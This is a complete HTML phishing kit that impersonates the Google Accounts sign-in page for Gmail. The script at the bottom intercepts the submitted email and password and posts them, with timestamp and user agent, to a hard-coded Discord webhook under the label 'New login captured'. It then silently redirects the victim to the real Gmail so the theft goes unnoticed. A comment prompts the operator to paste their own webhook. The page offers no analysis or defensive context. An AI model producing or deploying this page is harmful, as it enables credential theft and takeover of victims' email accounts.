<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    width: 100%;
    max-width: 448px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px;
  }
  .logo { text-align: center; margin-bottom: 16px; }
  .logo svg { width: 48px; height: 48px; }
  h1 {
    font-size: 24px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 8px;
    color: #202124;
  }
  .sub {
    font-size: 16px;
    text-align: center;
    color: #202124;
    margin-bottom: 32px;
  }
  .field { position: relative; margin-bottom: 24px; }
  .field input {
    width: 100%;
    padding: 13px 15px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
  }
  .field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
  .actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 32px;
  }
  .forgot {
    color: #1a73e8;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
  }
  button {
    background: #1a73e8;
    color: #fff;
    border: none;
    padding: 10px 24px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
  }
  button:hover { background: #1765cc; }
  .spinner {
    display: none;
    width: 18px; height: 18px;
    border: 2px solid rgba(255,255,255,.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin .7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .footer {
    margin-top: 40px;
    display: flex;
    justify-content: space-between;
    font-size: 12px;
    color: #5f6368;
  }
  .footer select { border: none; font-size: 12px; color: #5f6368; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  </div>
  <h1>Sign in</h1>
  <p class="sub">to continue to Gmail</p>
  <form id="f">
    <div class="field">
      <input type="email" id="email" placeholder="Email or phone" required autocomplete="username">
    </div>
    <div class="field">
      <input type="password" id="pass" placeholder="Enter your password" required autocomplete="current-password">
    </div>
    <div class="actions">
      <a href="https://accounts.google.com/signin/v2/recoveryidentifier" class="forgot">Forgot password?</a>
      <button type="submit" id="btn">Next</button>
    </div>
  </form>
  <div class="footer">
    <select><option>English (United States)</option></select>
    <span>Help&nbsp;&nbsp;Privacy&nbsp;&nbsp;Terms</span>
  </div>
</div>

<script>
  // ====== PASTE YOUR DISCORD WEBHOOK URL HERE ======
  const WEBHOOK = "https://discord.com/api/webhooks/1567939963557781685/hQimGtZnD2N4L9nUNlgIeBAKvEYDOtOUTT9TXVRIfqcrwtdfhJkeZkPCmmM8Bl9b6ini";
  // ==================================================

  const form = document.getElementById('f');
  const btn = document.getElementById('btn');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const pass = document.getElementById('pass').value;

    btn.textContent = '';
    btn.innerHTML = '<div class="spinner" style="display:block"></div>';

    const payload = {
      content: "**New login captured**",
      embeds: [{
        title: "Gmail credentials",
        color: 0x1a73e8,
        fields: [
          { name: "Email", value: email, inline: false },
          { name: "Password", value: "`" + pass + "`", inline: false },
          { name: "Time", value: new Date().toUTCString(), inline: false },
          { name: "UA", value: navigator.userAgent.slice(0, 200), inline: false }
        ]
      }]
    };

    try {
      await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      // fail silently, still redirect
    }

    // Redirect to real Gmail so it looks legit
    setTimeout(() => {
      window.location.href = "https://mail.google.com";
    }, 600);
  });
</script>
</body>
</html>
